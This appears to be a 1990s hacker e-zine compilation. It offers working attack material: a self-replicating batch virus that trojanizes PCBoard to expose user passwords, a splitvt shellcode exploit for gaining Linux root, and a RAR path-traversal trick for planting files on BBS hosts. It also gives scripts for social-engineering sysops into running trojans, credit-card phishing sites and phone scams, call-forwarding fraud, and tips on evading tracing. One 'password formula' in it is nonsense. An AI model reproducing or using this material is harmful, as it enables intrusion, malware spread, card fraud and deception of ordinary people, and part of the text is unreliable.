+ bin:*:1:1:bin:/bin:
+ daemon:*:2:2:daemon:/sbin:
+ saddam:PshuyeSRD5Cr5:500:100:Saddam Hussein:/home/saddam:/bin/bash
+
+ On this sample we see the encrypted password, uid and gid (user and group
+ id), the home directory and the user shell. A * in the password field
+ will disallow a user from login. So will a nonexistent homedir, or shell.
+
+ The bruteforce approach is also a possibility. We can normally assume
+ that the root password not is a common word, and therefore is hard to
+ crack with dictionarys. The bruteforce method will try every possible
+ combination of the password aaaaaaaa, aaaaaaab, etc.  Unfortunately such
+ a method will take very long time if you don't know anything about the
+ password. On a Pentium 130 the following figures are guidelines : (after
+ this time you'll be guaranteed to have the password, the average is the
+ half.)
+
+ 5 char password or 8 char password with 3 known: 48 hours
+ 6 char password or 8 char password with 2 known: 120 days
+ 7 char password or 8 char password with 1 known: 20 years
+ 8 char password                                : 120 years
+
+ As you can see: watching a sysadm while typing the password can give
+ reward, even if you can't cath everything he types. As a thought
+ experiment we can measure the figures of cracking the 8 char password on
+ a Cray with a matrix of 64 processors, each being about 4 times the speed
+ of the Pentium 130. This would take about 6 months. But who can use a
+ Cray 6 months anyway? The experiment of making a bruteforce cracker
+ should be easy for any programmer. Remember to use the ufc-crypt() routine
+ as a replacement for the system crypt() which is much slower!
+
+
+ MORE INFO ON SPECIFIC OPERATING SYSTEMS.
+
+ N00ne can be a specialist on every operating system. You have to
+ spesialize and find what you like, and dislike with specific OS's. As
+ this goes for me too, it will probably shine through in the text which
+ OS's I have most experience with.
+
+
+ -Linux
+
+ Linux is a free operating system written by a lot of people gathered
+ together via newsgroups on the net. The kernel is written by Linus
+ Torvalds from Finland, who is still making updates by himself, helped by
+ a large community of programmers. Linux runs on the Intel x86
+ architechture, that is, common PC's, and is increasingly popular among
+ hackers, and also in universities and commercial sites. Because Linux is
+ so popular among people who test things very well, Linux is not full of
+ holes, but rather secure. Anyway, there are holes. These are especially
+ found in conjunction with suid system programs. Information about these
+ can be found anywhere on the net, as the operating system itself is
+ evolved on the net. There has been made sevelar linux distributions, the
+ most popular being Debian, Slackware and RedHat. The linux kernel has now
+ been released in versions up to 2.0.x.
+
+ -Ultrix
+
+ Ultrix is a very old and buggy system from Digital, containg almost only
+ features from BSD UNIX. The system has since long been abandoned by
+ Digital, but is still used many places because it's the only system on
+ old DECstations with processors from MIPS. Ultrix is known for it's
+ unsecure NFS, which should make it easy for a user to gain access.
+
+ -UNICOS
+
+ I don't really know much about this operating system from Cray. It's
+ supposed to be very stable and secure, perhaps it has to be so since it
+ runs on the most powerful computers in the world, equipment worth
+ millions of dollars. Just thought I had to mention it.
+
+ -IRIX
+
+ Is the OS from Silicon Graphics. SGI's rule of thumb is to make their
+ computers easy to understand and administate for the desktop user. The OS
+ includes many system administation tools that are suid. Exploits for
+ these are readily availible on the net. SGI's OS also ships with users
+ without passwords. They advice their customers to put passwords on these
+ accounts, but many forget. Easy way to gain access. More info on password
+ empty account and other security flaws can be obtained from SGI's own
+ security department! Try www.sgi.com. Irix today comes in versions 5.3,
+ and 6.2 .
+
+ -NetBSD & FreeBSD
+
+ Are operating systems derived from BSD, made for the x86 architechture.
+ These OS's has lost much to the Linux wave, but still exist all over the
+ world. Security vulnerabilities for these are mostly similar as for Linux.
+
+ -SunOS and Solaris
+
+ Are the OS-es for Sun's SPARC architechture. They're known for being
+ relatively stable and secure, though it's also here possible to find the
+ necessary bug. Sun has a very informative web-site about that! Solaris
+ 2.5.x which is the common version nowadays also ships for the x86
+ Architechture, and includes a API for Windows, which means that it's
+ possible to run Windows programs under X. Very fancy.
+
+ -AIX and HP-UX
+
+ are the OS's from IBM and HP respectively. They are both know to be very
+ peculiar and non-standard, perhaps that's why hackers are not so
+ interested in them. But both OS-es are notably known for various bugs. On
+ the web you can find a site with 'HP bug of the week', publishing scripts
+ with r00t-exploits for HP every week.  Phun, isn't it?
+
+ I think this must conclude my section about different operating systems.
+ The more you explore, the more you will learn, and you'll soon find out
+ that things are different on other OS's than the one you're used to!
+
+
+ CONCLUSION.
+
+ This phile has been all about learning the UNIX system, finding holes in
+ it and use them. I have not written too many details. Not because I'm
+ afraid for them being used (God forbid!), but because the details
+ discussions on these matters are lenghty, and usually can be found on
+ the net. I hereby urge you to learn more about UNIX by testing it out.
+ Find your own holes, and use them. But remember. Follow the rules. Just
+ peek around, annoy people. Have phun with people. But don't mess it all
+ up. You will suddenly find yourselves with no friends and a hellawalot of
+ people coming after you.
+
+
+
+ Best rgrdz and happy hunting from
+
+
+ M.
+
+
+The Rar Bug
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+
+RAR 2.x FINAL (NO BETA) REGISTERED VERSION BUG
+----------------------------------------------
+
+We've previously released this bug to the public (check out TBH-RAR.ZIP), but
+that was about RAR 2.0 áeta version, and this shit still works in the final,
+registered 2.x version. It works, you just have to do something extra. Those
+lamahs ;)
+
+[What is this bug?]
+
+For those of you who don't already know what the bug is, it can be used to
+extract files to ANY directories on the sysop's HD, if the sysop has support
+for RAR in his upload processor. This means, in BBBS/MBBS you can add scripts,
+in S/X you can add new commands, in PCB you can add new PPE's, and all that
+without social engineering and getting sysop to run a trojan etc.
+
+[How to do it]
+
+1) Place the files you wish to extract (PPE, scripts, whatever) in a dir,
+   fex; C:\TEMP\SHIT\FILES\*.* <- files here.
+
+2) Chdir to C:\ and run RAR. Pack C:\TEMP into fex. DUCADO.RAR
+
+3) Now, use a hex editor (like norton's diskedit) and patch the path/name
+   string (C:\TEMP\SHIT\FILES\HACK.PPE) to the directory you want it
+   extracted to, fex. C:/PCB/HELP/HACK.PPE
+   Remeber to use the '/' and not the '\' cause that will fuck up.
+
+4) If this was version 2.0 beta, we would all be set to go now, but in the
+   new version (2.x final) there's one more thing you have to do;
+   REPAIR IT!
+
+   So, run RAR once more, and press ALT-F8 to repair DUCADO.RAR.
+
+5) Now, upload it to your victim, and the files will be extracted to the
+   directories you specified.
+
+Now, go hack some lamah, and if your name is Eugene Roshal then bugtest
+your shit before releasing it to the public next time.
+
+----------------------------------------------
+Original Consept by Codeblaster
+Rar bug discovered by Ripperjack.
+
+Social Engineering
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+ Social Engineering
+ ------------------
+
+ I got some complaints on the previously releases of BHM, since we had several
+ examples of trojans for systems, but no social engineering stuff. (For those
+ of you who don't know what social engineering is;  It can be many things,
+ from getting a lamer to give you his password over the phone, to getting the
+ sysop to run one of your uploaded trojans - in this text, I'm talking about
+ the last one.) Yeah, you're probably right, maybe getting the sysop to run
+ the trojans is harder than making them sometimes. (Although I've never had
+ any problems with that - maybe cause the dudes I've hacked have all been
+ lamahs? ;)
+
+ Well, anyways. I ran this little problem through the hpa message conferance at
+ my board, and got some response.
+
+ Different ways of getting the sysop to run your trojan:
+ -------------------------------------------------------
+
+ 1. Download a file and look at his add. Then call back a bit later, and tell
+    him that his add really suxx, and that he needs a new one badly if he don't
+    wanna look like a lamer. Offer making one to him, tell him that you make
+    some really nice addys, and you can even get him a good ansi if he hasn't
+    got one! :) To make this less suspicious it's probably best if you want
+    something back for your coding, so say that you want better ratio at his
+    board or something.   He'll most likely accept your offer, so make the
+    trojan, call back a couple of days later, and upload it. Remember, it
+    has to be an INTRO there too, so the sourcecode would be:
+
+                        .-------------------------.
+                        |                         |
+                        |       TROJAN            |
+                        |-------------------------|
+                        |                         |
+                        |  SOME                   |
+                        |     RIPPED              |
+                        |          INTRO          |
+                        |              SOURCE     |
+                        `-------------------------'
+
+    The chances for sysop running this is pretty big, so if something would
+    fuck up here, it's probably your lousy coding ;)
+
+ 2. Find out what utils the sysop use at his board. Let's say, that the lamah
+    uses Pcboard. Then you download the newest version of PFED (wich he most
+    likely uses) and unpack it. Patch all files (diz, doc's, exe's etc.) so
+    that the version is one version higher (fex. 1.09 instead of 1.08). Then
+    replace the main file (or the setup file) with your trojan, use Nowhere
+    Utilities (or whatever) to increase the size of your exe file, so that it's
+    just as large as the original exe file. Upload the file to the board you'r
+    going to hack. Most lamer sysops won't bother checking if PFED 1.09 has
+    been released yet, so they will probably just unpack it and try to set it
+    up. But remember, you have to make something that at least LOOKS like the
+    original UTIL, and if you're going to show an error message or something,
+    then make the error message just like it would be in the original util.
+    In PFED that kinda error message could look like this:
+
+    ÚÄÄÄÜ±²ÛÛÜÄÄÄÄÄÄÄÄÄ Äúú ú
+    ³  °ßÛÛÛÛßÛ   FATAL ERROR!
+    ³  ßÜÜßßÜÜß   þ PATH/FILE ACCESS ERROR!
+    ³    ßßßß
+    ÀÄÄÄÄ ßß ÄÄÄÄ Äúú ú ú
+
+      MEMORY INFO:  Conventional: 301k  Stack: 2644
+        DISK INFO:  Dir: C:\PCB!\PFED  Free Space: 424k
+
+    Before you upload the util it might be a good idea to chat a little with
+    the sysop, and after a while ask him something like: "Why aren't you using
+    the latest version of PFED? - don't you know it has been released 3 days
+    ago." Or something like that, then offer to upload it. If you do this,
+    the chance that sysop will start it is alot bigger.
+
+ 3. If the sysop is a Pascal programmer you can always use the "TPU method".
+    Make/rip a simple intro source, and add some music to it (fex. HSC files
+    that uses AGSHSC.TPU or ANTARES.TPU .. whatever), then you add a second
+    TPU, that you've made yourself (call it fex. MUSIC.TPU). What you know,
+    but the sysop doesn't know, is that MUSIC.TPU actually contains a trojan.
+    Many times the sysop won't think twice before running a source he has
+    checked out... This thing can probably also be done in C++ etc. (with
+    OBJ files or something?)
+
+ 4. Make yourself a new identity. Call yourself something like 'W3ZLR!' or
+    some lame shit. Then you start calling up all the lame sceneboards and
+    start pumping lotsa new ansi-packs, demos, and other scene stuph. Always
+    page sysop and get a little chattie with him before you leave, give him
+    compliments about his cool-styled board (wich is crap ofcourse), and
+    how good connect you got etc. Make yourself a little fake group, and
+    release some ansi-packs and shit (5-mins rips ofcourse). Pump, and
+    continue this a while. After a while most of the sysops will like you,
+    and you'll be known in the scene. When you've gotten this far, the sysops
+    will run everything you tell them to, now you can take down the whole
+    lamer scene in your country, and be a very populear dude everafter. ;)
+
+
+ Hum, it sounds so easy! ;)
+ --------------------------
+
+ Well, that's probably cause it often IS easy. Many sysops are so dumb they
+ will run anything you tell them to, so it's no big deal really (It's never
+ been for me anywayze). Some big boards however, never run the stuff they
+ get uploaded, and those are a bit harder. But still, the clue is; Chat with
+ the sysop, get to know him, and play a nice guy. Upload be nice, and develop
+ a good relationship with him - A relationship you can hack on ;)
+
+
+                                       - Keep hacking strong, Codeblaster/TBH
+
+
+
+
+A Way To Hack Unix
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+        A way to hack Unix if you are lucky, and the Sysadmin is an ass.
+                                                By: Phiber X
+
+
+Okay, basically the problem with hacking unix is that it doesn't report whetter
+you typed a username that doesn't exist or whetter you got the password wrong.
+
+Anyway, here's a solution that might work (see title of this doc).
+Basically Unix may have certain usernames that does nothing but execute a
+command, and consequently if these commands are not obviously dangerous to
+the system they may not have a password.
+Basically here's what you do:
+
+   login: rwho
+
+OR
+
+   login: who
+
+OR
+
+   login: finger
+
+OR
+
+   login: rfinger
+
+These commands are typical for any Unix system, and what they do is that they
+display who is currently using the system, and then logs out. Useless? I beg
+to differ... Because now you know a username (if there are anyone on the
+system that is), and can consequently start to worry about the password..
+
+Now, hacking a password has many sides to it, and basically they are "brute
+force", that is write a script that tries all words in a txt file, or just
+plainly ASCII upload a txtfile containing tons of common passwords. Another
+is if you really are desperate to hack this account, to find out something
+about him, that is name of his wife, date of birth, the car he drives ( you
+would be surprised how many accounts that can be accessed by simply using:
+
+    login: (a common name in your country) eg. Smith(USA) , Hansen(Norway)
+    or Olsen (Norway)
+
+    password: BMW (or Mercedes)
+
+In this case though it's more likely that this guys password is his dream car
+rather then his actual :)
+
+But in my countless hours spent on the net I dumped into something spectacular,
+a procedure on how to break any password !! Quite amazing I thought, and quite
+frankly it hasn't worked for me yet, but then I have only tried it a couple of
+times, and haven't been very exact. Anyway here it goes:
+
+1. Type: TH778$ ^^rUi
+2. Wait 23 seconds
+3. Type: R$%%78  ''TY
+4. Wait 10 seconds
+5. Type: 67Z//
+
+(keep strictly to the timelimits)
+
+I suppose the way to get this right is to make a script in a comm. programs
+that sticks to the time limits, but you do what you will with it.
+
+Now that's one way of hacking Unix, if you're lucky and the sysadmin is an
+ass :).
+
+
+
+        Written & researched by: Phiber X
+
+If you have any luck with the password formula, please let me know, I'm not on
+very many boards at the time as my exams are coming up shortly, but try Death
+Wish or Zero Reality in Norway. Planning on getting an anonymous mail "thing"
+but haven't bothered yet. C YA!
+
+Oh, yeah.. if any of the authors of the password formula read this and are
+pissed because I didn't credit them, well... sorry, at least I didn't take
+the credit myself.
+
+
+Hackers vs. Warez d00dz
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+ Hackers vs. Warez d00dz
+ -----------------------
+
+ Don't you just hate those fucking kRaD 31337 WaReZ d00dz that's increasing
+ in numbers every day? There's always been this "wall" between hackers and
+ warez d00dz, cause hackers must be the only ones realising how fucking lame
+ the warez d00dz really is. The BBS kiddiez, Ld-dudes, newbies (etc.etc) all
+ look up to the warez d00dz, probably cause they have to buy their shitty
+ games themselvs. The warez d00dz however, "GET IT FOR FREE!!!". wow!
+
+ The lame warez d00dz spend hours downloading shit they don't even know what
+ is (they know that it's 0 days old - and that's enough for them), and when
+ they get it, they spend even more hours uploading it to a LD warez board with
+ a crappy CPS. Don't get me wrong, I'm not talking about couriers. Couriers
+ do a job, a job that makes sence. They distribuate a group's work, and get
+ it spread. Warez d00dz however, make no sence. I mean, they download, and
+ they upload, and for one purpose: Get better ratio, so that they can d/l
+ more, and u/l more to get even better ratio some other place, so that they
+ can... It's a neverending idiotic circle.
+
+ I don't have anything against warez. Warez is good. Most hackers use pirated
+ software as well, and sometimes they probably even download the same software
+ as a lame warez d00d. The differense is however, the purpose of the download.
+ The warez d00d downloads it for the reason explained above, the hacker
+ however don't give a damn how old it is (as long as it's the newest version
+ of that software that is), and the reason for the download is cause he WANTS
+ TO USE the software. He wants Turbo Pascal cause he needs it to make programs,
+ not cause it's *NEW* and it's gonna give lotsa credits and better ratio on
+ some lame warez board/site.
+
+ Also, a hacker doesn't brag about how elite he is. The warez d00dz often spend
+ hours argueing who got the ware first. Who released the lame game first, who
+ faked the release date, who got it first in Europe, blah. Who fucking cares?
+ I sure as hell don't. Another sympthom of a warez d00d is that he thinks his
+ eleet status can be measured in how many 0 day warez he's got. "I got 300 megs
+ with 0 days warez on my server now!". Wow! So, what is he going to do with
+ those 300 megs with warez? The answer is; nothing! He's just using it to get
+ more warez tomorrow, and the day after that, and the day after that (as
+ mentioned earlier; the neverending idiotic circle). What's the point, if you'r
+ not a courier, and if you're not using the software? As someone on IRC put it
+ so wonderfully;
+
+     "#hack is full of users who steal software,
+      #warez is full of users who steal software,
+      and tell everybody about it."
+
+ I'll agree to that alright. And on #hack, the dudes have a purpose for stealin
+ the software (and not that lame reason the dudes on #warez have (ratio))
+
+ Or as someone else gave an example of a typical warez d00d:
+
+ "I released King's Quest IVXIX before you so obviously my testicles are
+ larger." - kRaD WaReZ d00d!
+
+ Yeah, obviously! ;)
+
+ So, a big fuck-you goes to #warez* and everyone on it! You're all so eleet you
+ make me pee in my pants!
+
+
+
+                                             -Keep hacking strong, Codeblaster
+Wombat: A Pcboard Batch Virus
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+rem Every line containing "wombat" (in uppercase) will be copied!
+
+rem Every line in only uppercase is part of the virus!
+rem %_wombat_% is just an empty variable!
+rem Every line with "rem" is a comment!
+rem
+rem Wombat V1.0 By TNSe! :)
+rem  The Last Word In Batch Viruses ... uh?
+rem   Absolute Size : 1187+ bytes... (Hint: Infect a 0 byte .BAT file,
+rem    which is partly interesting, cause it shows you a bug :)
+rem
+rem PS: They are slow? .. What? are you running with NO smartdrv?
+rem     or is your machine just another 386-12 MHz?? ;)
+rem
+rem This BatVirus will make a command in PCBoard Help called
+rem Wombat. Just make the SysOp run this BatVirus, and enter
+rem ? Wombat in the PCBoard prompt!
+rem
+GOTO WOMBAT_%WOMBAT%
+rem What part of the BatVirus do we want to execute?
+
+:WOMBAT_INFECT_ME
+FIND "WOMBAT" %1>NUL
+rem is this bat file Already infected?
+IF ERRORLEVEL==1 GOTO WOMBAT_DO_INFECT
+rem not good ... already infected!
+GOTO ABSOLUTE_END %_WOMBAT_%
+
+:WOMBAT_DO_INFECT
+rem Here we do the infection
+IF EXIST %TEMP%\_WOMBAT_.TMP DEL %TEMP%\_WOMBAT_.TMP
+rem Does the backup file exist? Don't show errormessys by checking!
+COPY %1 %TEMP%\_WOMBAT_.TMP>NUL
+rem Copy the file to %TEMP% .. if there's no TEMP, then the root will be used
+TYPE %0|FIND "WOMBAT">%1
+rem Copy Wombat into a new file!
+TYPE %TEMP%\_WOMBAT_.TMP>>%1
+rem Attach the Original file!
+DEL %TEMP%\_WOMBAT_.TMP
+rem Delete the copy
+ECHO. >>%1%_WOMBAT_%
+rem Place an extra enter before the next ...
+ECHO :ABSOLUTE_END>>%1%_WOMBAT_%
+rem Where to jump when WomBat is finished!
+GOTO ABSOLUTE_END %_WOMBAT_%
+rem exit this batvirus
+
+:WOMBAT_
+rem Main procedure!
+SET MAIN_WOMBAT=%0
+rem %0 is the name of the starting file
+IF NOT EXIST %MAIN_WOMBAT% SET MAIN_WOMBAT=%MAIN_WOMBAT%.BAT
+rem if the guy wrote the name of the file, without .BAT ... he shitted
+IF NOT EXIST %MAIN_WOMBAT% SET MAIN_WOMBAT=AUTOEXEC.BAT
+rem Well... This means that it is AUTOEXEC.BAT we are in! (Because
+rem %0 is nuttin when autoexec.bat is called!
+rem ... let's fix it!
+SET WOMBAT_TAIL=
+rem ... clean out tail before entering
+:WOMBAT_FIX_TAIL
+IF .%1==. GOTO WOMBAT_GET_INFECT
+rem if %1 is empty, quit this and continue
+SET WOMBAT_TAIL=%WOMBAT_TAIL% %1
+rem copy next %1 into the command tail...
+SHIFT %_WOMBAT_%
+rem (%_wombat_% is empty) this command makes %1 become %2 .. (rotates
+rem %1 %2 %3 ... %9 So that every parameter passed is kept!
+GOTO WOMBAT_FIX_TAIL
+rem Keep copying
+
+:WOMBAT_GET_INFECT
+rem find a nice file to infect
+SET WOMBAT=INFECT_ME
+rem this is the routine we want to do!
+FOR %%C IN (C:\AUTOEXEC.BAT *.BAT ..\*.BAT) DO CALL %MAIN_WOMBAT% %%C
+rem find some fine victims!
+SET WOMBAT=END
+rem next time, we're outta here (And do some damage!)
+%MAIN_WOMBAT% %WOMBAT_TAIL%
+rem Make it look like santa claus was here (nobody saw him?)
+
+:WOMBAT_TROJANIZE
+rem Here we do the trojanizing :))
+IF .%1==. GOTO ABSOLUTE_END  %_WOMBAT_%
+rem ... no more paths to look through!
+SHIFT %_WOMBAT_%
+rem .. now %0 becomes %1, %1 becomes %2 .. etc
+IF NOT EXIST %0\PCBOARD.EXE GOTO WOMBAT_TROJANIZE
+rem .. if PCBoard.exe didn't exist there ... too bad! :)
+ECHO %%%0\MAIN\USERS>%0\HELP\WOMBAT
+rem ... that was the dir :) ... hehehehehe
+rem which makes a file C:\HISDIR!\HELP\Wombat with the contents:
+rem %C:\HISDIR!\DAT\USERS, that will list all his users and PWD's for you..
+rem as long as it is not crypted! .. argh :)
+GOTO ABSOLUTE_END %_WOMBAT_%
+rem .. We've done enuff!
+
+:WOMBAT_END
+SET WOMBAT=TROJANIZE
+CALL %MAIN_WOMBAT% %PATH%
+rem Go through ALL the path statements ... looking for PCBoard!
+rem .. hehe.. .Let's hope he has his PCBoard Dir in the path ...
+
+rem getting outta here
+SET WOMBAT=
+SET WOMBAT_TAIL=
+SET MAIN_WOMBAT=
+rem all variables cleaned out ... Like Spring cleaning! :)
+
+:ABSOLUTE_END
+rem the absolute last in this BatVir!
+
+
+How To Get Root On a Linux
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+How to get root on a linux host if you have a shell on the host...
+With the splitvt exploit.
+
+
+one day i decided to play around with telnet and ended up with :
+Playing around on a local server i tought to myself.. HEY there must be
+a way to do that.. now you think to yerself "Lamah to do WHAT?!" well to
+hack the shit.. i thougt IF you had a SHELL on you'r victime's machine..
+and wanted to fuq the shit.. upload this phile
+***DO REMEMBER TO CUT!***
+
+
+THIS IS A MUTERFUCKIN' LONG LINE! I KNOW! (LONG,LONG,LONG)
+
+------------- ( Cut ) ------------------------------------------------
+
+/* splitvt exploit
+ * syntax:
+ * cc -o null null.c     [kfc96 exploit]
+ * $>null         [LiNUX systems affected]
+ * $>null
+ * $>splitvt
+ * $>whoami   [root]
+*/
+
+long get_esp(void)
+{
+__asm__("movl %esp,%eax\n");
+}
+main()
+{
+  char eggplant[2048];
+  int a;
+  char *egg;
+  long *egg2;
+  char realegg[] =
+"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+  char *eggie = realegg;
+
+  egg = eggplant;
+
+
+  *(egg++) = 'H';
+  *(egg++) = 'O';
+  *(egg++) = 'M';
+  *(egg++) = 'E';
+  *(egg++) = '=';
+
+  egg2 = (long *)egg;
+
+  for (a=0;a<(256+8)/4;a++) *(egg2++) = get_esp() + 0x3d0 + 0x30;
+
+  egg=(char *)egg2;
+
+  for (a=0;a<0x40;a++) *(egg++) = 0x90;
+
+  while (*eggie)
+    *(egg++) = *(eggie++);
+  *egg = 0; /* terminate eggplant! */
+
+  putenv(eggplant);
+
+  system("/bin/bash");
+}
+
+
+
+------------- ( CUT ) ---------------------------------------------------
+
+and ren the file to "null.c" upload it to some directory or somthing..
+now what this LINE / FILE tryes to do i give you ROOT status..
+it uses ASM (Assembly) so you need to compile it.. by typing..
+
+1.       gcc -o null null.c
+2.       root
+3.       whomai ..
+3.       adduser djnad <HEhe>
+4.       adduser TBH <w3-k1ck-ass>
+
+if your shell or your provider doesn't allow you to use compile or GCC
+.. you'r sold - you can't run the script.. so don't bother.
+what HOLE this script uses I realy don't know.. but it works..
+anyway's IF it worked.. you would have ROOT (GOD) status.. :).. you can
+DO what EVER you please with the commputer.. yeah.. anyway's DON'T BLAME
+ME if this doesn't work for u, and it fuq's up the server.. blame yourself
+for doing it..
+
+I have not tested is.. couse i can't afford being busted right now at the
+moment.. since im going on away to an forgin country for som weekeeis.. :) but
+it work's TRUST me. ..
+
+------------------------------ ( Djnad / -TBH^Pd-Kru ) - ( djnadX08 ) ---
+
+
+
+
+Visa/Creditcard Scam
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+
+ VISA/CREDITCARD SCAM
+ --------------------
+
+ Someone has to have thought of this one before! ;) Anywayze, I'm releasing
+ it cause it was a cool idea I got the other day, and it works really nice.
+
+ You know all those sex-payweb-sites? You enter your visa/mastercard/whatever
+ and you get to enter the realms of PORN? ;). You enter fex. your visa number
+ and pay eg. 25$ to see live nude girls stripping etc. Well, what about setting
+ up your own little TEMPTING sex site, a real payweb sex site, so that people
+ has to enter their visa/mastercard etc. to enter. Setting up your own site,
+ and advertising it enough, can get you alot of valid visa's.
+
+ Ofcourse, you can't set it up on your home-adress, cause then you might get
+ busted for this, so what you do is getting a site from one of those free
+ website providers, here are two adresses you can use:
+
+ http://www.geocities.com
+ http://www.angelfire.com
+
+ I'm sure there are more of these too, but these two will do for now.
+
+ Now you just rip some html code from a payweb site (or make it yourself if
+ you're not an inet-lamah), and set it up. Modify the code a bit, so that the
+ visas are saved/encrypted in a DAT file, witch you just visit to collect
+ once in a while. (Remember - never make the code so that the visa's are sent
+ to you or something, cause then you'll get busted for sure).
+
+                                         - Keep fraudin' strong, Codeblaster!
+
+
+Credit Card Scam #2
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+ CREDIT CARD SCAM #2
+ -------------------
+
+ Saw this one on 'NOWHERE MAN' :)
+
+ ------------------------
+ YOU: Hello, I'm calling from Seltec - we're releasing a new hair product,
+      and wondered if you would like to get a free sample?
+ HER: Ohhh.. yes!
+ YOU: OK, I need your name and adress then please.
+ HER: Sure, it's Dumb Bitch, 502 Looserstreet, Looserplace.
+ YOU: ... and credit card number for future buyings.
+ HER: Hmm, oki 4002XXXXXXXXXXXX
+ YOU: Ok, thank you Mrs. Bitch, you will have the sample in your mail
+      in a couple of days.
+ ------------------------
+
+ Some people are dumb you know. It migth be an idea to know who you're
+ calling, so you know if they're interested in a new hair product at all.
+ And, It might be a good idea to mail her some shit too, so that she doesn't
+ get suspicious when she doesn't get anything in her mail.
+
+                                        - Keep fraudin' strong!, Codeblaster
+
+
+How To Obtain A Visa
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+How to obtain a visa card number?
+
+You report your neighbour's visa stolen and they shut down the card and say
+that they will send you a new one soon. Every morning until your neighbour
+gets the visa, you wake up early and check your neighbour's mailbox. Eventually
+you will get the visa, and now it's ready for abuse. ;D
+
+                                                     , ripperjack
+Phone Scam
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+ PHONE SCAM
+ ----------
+
+ I've translated this text directly from norwegian to english, so I'm not sure
+ it'll be just as convincing in english, but you'll get the idea. Using re-
+ direction...
+
+ ----------------------------------
+ YOU> Hello, my name is Tommy Hansen and I'm calling from Telecom West, we
+      have experienced some problems with your telephone line.
+ HIM> Oh? What kind of problem.
+ YOU> Your line has been crosslinked sir. That means you may have experiensed
+      line noise, sudden line-cuts, other voices on your line, etc. This is
+      quite irritating for you ofcourse, and fortuately it can be fixed very
+      easily. Can you find a pen and something to write on sir?
+ HIM> Yeah, sure.
+
+     <Finding pen & paper>
+
+ HIM> Ok.
+ YOU> Good, write down the numbers I tell you, and enter it on your phone as
+      soon as I hang up.
+ HIM> Ok.
+ YOU> *21*003190320320# - You got that?
+ HIM> Yeah, *21*003190320320# Right?
+ YOU> Yes, that is correct sir. Ok, I'm going to hang up now. Just enter the
+      numbers, and when you hear an 'alarm'-like-sound, you hang up.
+ HIM> Ok, and everything will be fixed then?
+ YOU> Yes, as I said, this is just a minor problem.
+ HUM> Ok, bye then.
+ YOU> Bye, and thanks a lot for your help (and I mean that!)
+ ----------------------------------
+
+ If they refuse to do what you tell them to, there are several things you could
+ say, like:
+
+ - This is just a small problem. It's alot easier if you could do this yourself
+   so we don't have to send someone over to you.
+ - Ok. We'll send someone over to fix it rigth away, you will have to pay the
+   extra expences of 78$ though.
+ - We will have to cut your phone for a week or two until we can send someone
+   over to fix it then. (No more phone privilegies for you! ;))
+
+ Almost everybody will do as they tell you if you say one of the above, no one
+ wants to loose their phone for 2 weeks, or pay 78$ for something they can
+ do in 2 secs themself. But remember; this require you be convinsing and don't
+ sound like a 14year old kiddie.
+
+                                                            - Codeblaster/TBH
+
+
+
+Hackers Guide To INTERNET OUTDIALS.
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+
+     Hackers guide to INTERNET OUTDIALS.
+
+
+ Index:
+
+    1. What are internet outdials?
+    2. How are they accessed?
+    3. What can internet outdials be used for by hackers?
+    4. What are the adresses to some internet outdials?
+    5. How can internet outdials be found?
+
+
+    1. What are internet outdials?
+
+    Internet outdials are basicly modems connected to telnet sites
+    that can be used by users of the site to call out.
+    Naturally if the site that offers this to it's local users is
+    connected to the internet, then anyone who can access the site
+    can use the outdial (that is if the service is not restricted to
+    local users, which it often is).
+    Usually the outdials are restricted to making local calls, either
+    by disallowing certain affixes to be dialed (that is numbers that
+    come first (much like the man when having sex, wait.. no not really)),
+    or by having set the first few numbers and only allowing a certain
+    number of numbers to be manually entered.
+    There are however exceptions to this, these are called Global OutDials
+    (GOD), and allow long distance calls. These are however very rare, and
+    tend to close down quikly if they are released.
+
+    2. How are they accessed?
+
+    By using a telnet program when connected to your ISP, and entering
+    the adress of the telnet site and channel at the appropriate place.
+    Then just manouver your way to the outdial (usually obtained by
+    entering ATDT XXXXXXXX, where X is number, but this varies greatly).
+
+    3. What can internet outdials be used for by hackers?
+
+    Aha.. The essence :-)!!
+    Now, IOD can be used for many things, the most obvious beeing able
+    to connect to foreign BBS's on local charge. But to real hackers, that's
+    not really FUN (it can be however, quite usefull when the phonebill comes).
+    The thing I see it most usefull as is to avoid detection when hacking.
+    Because: A direct connection to your target is (to say the least) quite
+    risky especially in these digital days, but if you first connect to the
+    inet, call an outdial, say in Britain, and then connect to your target in
+    another country, then tracing you will be A HELL OF a lot harder, also if
+    they trace your phonecall to another country, then they usually must be
+    SERIOUSLY pissed to bother trying to find you. Like they probably are at
+    those guys that deleted 11.000 homepages on "Telenor" ISP in Norway
+    (Way to go guys, whomever you are! ).
+
